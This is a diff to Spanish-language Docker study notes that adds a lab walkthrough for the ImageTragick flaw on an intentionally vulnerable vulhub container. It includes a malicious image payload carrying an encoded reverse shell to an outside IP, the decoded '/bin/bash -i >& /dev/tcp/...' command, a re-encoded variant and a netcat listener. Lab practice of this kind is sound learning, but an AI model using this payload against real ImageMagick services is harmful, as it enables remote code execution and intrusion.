@@ -73,6 +73,8 @@ Tal y como se puede observar en la sección [Comandos](#Comandos), con el comand
 
 ### Docker Compose - Despliegue de máquinas vulnerables
 
+#### Kibana - Local File Inclusion
+
 A la hora de usar Docker, hay veces en las que se hace uso de muchos parámetros, es por eso que existen herramientas como **Docker Compose**, la cual permite definir todos los parámetros y configuraciones necesarias en un archivo con extensión *.yml*. 
 
 En este apartado se llevará a cabo el despliegue de máquinas vulnerables haciendo uso de **Docker Compose**. Las máquinas vulnerables están disponibles en el siguiente repositorio: [vulhub](https://github.com/vulhub/vulhub).
@@ -129,6 +131,59 @@ De esta forma, y cambiando la ruta en el comando `curl` (especificando el archiv
 Con el siguiente comando se puede visualizar la consola de una forma más visual y entendible:
 
 	script /dev/null -c bash
+
+#### ImageMagick - ImageTragick
+
+**ImageMagick** se trata de una herramienta de subida y procesamiento de archivos multimedia. En este ejemplo, se abusará de la vulnerabilidad que presenta esta herramienta, llamada **ImageTragick**. Esta vulnerabilidad nos permitirá subir un archivo malicioso que permita ejecutar un comando en consola.
+
+Para ello, se deberá nuevamente clonar el repositorio de la forma que se mostró antes. El repositorio en cuestión es el siguiente: <https://github.com/vulhub/vulhub/tree/master/imagemagick/imagetragick>
+
+Acto seguido, se hará uso del comando `docker-compose` que se usó en el ejemplo anterior para crear el contenedor.
+
+Como comando usado, pero que no tiene relacion con **Docker**, se ha de mecional `pushd` y `popd`. Estos comandos sirven para cambiar de directorio de una forma cómoda y rápida. Al ejecutar el comando `pushd /directorio/` nos cambiará al directorio especificado como `cd`, sin embargo, si una vez hemos cambiado de directorio usamos el comando `popd` nos devolverá al directorio anterior.
+
+Sabiendo esto, en el directorio **"/home/dalnitak/Descargas/"** procederemos a crear un archivo *"test.txt"* para subirlo al servicio y ver como actúa la subida de archivos.
+
+En este caso haremos uso de **burpsuite** para interceptar las peticiones y ver que ocurre. Actualmente estamos usando el puerto 8080 para el servicio, que es el puerto que usa burpsuite, por lo que deberemos cambiar en las opciones del proxy dicho puerto (hacer que sea el 8081 en vez del 8080). Además, se deberá editar el *add-on* de Firefox, ya que se le debe especificar a *foxyproxy* en que IP y que puerto está escuchando burpsuite.
+
+Nuevamente, volvemos a subir el archivo, y nos saldrá la petición interceptada en burpsuite. A continuación haremos un `ctrl + r`, para tener la petición en la pestaña de *repeater* de burpsuite. En esta pestaña podremos ver con facilidad cuál es la *request* y cuál es la *response*, además de poder enviar las peticiones.
+
+A continuación, para poder ver que extensión de archivo es válida, haremos un `ctrl + i`, de tal manera que las peticiones actuales sean enviadas a la pestaña *intruder*, en la cual se llevará a cabo un ataque de fuerza bruta.
+
+A continuación crearemos un archivo malicioso para subirlo, llamado *test.gif*. El archivo ha de tener la siguiente estructura:
+
+```
+push graphic-context
+viewbox 0 0 640 480
+fill 'url(https://127.0.0.0/oops.jpg?`echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzQ1LjMyLjQzLjQ5Lzg4ODkgMD4mMQ== | base64 -d | bash`"||id " )'
+pop graphic-context
+```
+
+Pero esta estructura deberá ser modificada, ya que el texto en *base64* que se usa en el ejemplo no está adaptado a nuestra máquina. Si decodificamos el texto en *base64* de la siguiente forma veremos que significa:
+
+	echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzQ1LjMyLjQzLjQ5Lzg4ODkgMD4mMQ== | base64 -d; echo
+
+- El `echo` al final del comando es para evitar que se añada un hashtag al final.
+
+El resultado de la ejecución de este comando es el siguiente:
+
+	/bin/bash -i >& /dev/tcp/45.32.43.49/8889 0>&1
+
+Es por eso que se deberá modificar, para indicar nuestra IP y nuestro puerto, de tal manera que cuando se suba este archivo al servicio de **ImageMagick** se nos envíe una consola *bash* a nuestra máquina. Para modificarlo se deberá hacer de la siguiente forma:
+
+	echo -n "/bin/bash -i >& /dev/tcp/172.17.0.1/4646 0>&1" | base64
+
+- El `-n` se usa para que no añada un salto de línea al final.
+- La IP debe ser nuestra IP dentro de la interfaz de Docker, para estar en la misma red que el contenedor.
+- El puerto puede ser uno cualquiera.
+
+Esto da como resultado lo siguiente, que deberá ser sustituido por el texto original del fichero:
+
+	L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE3Mi4xNy4wLjEvNDY0NiAwPiYx
+
+Ahora solo quedará ponernos en escucha por el puerto 4646 con *netcat*, y subir el archivo al servicio web.
+
+	nc -nlvp 4646
 
 ## Comandos
 
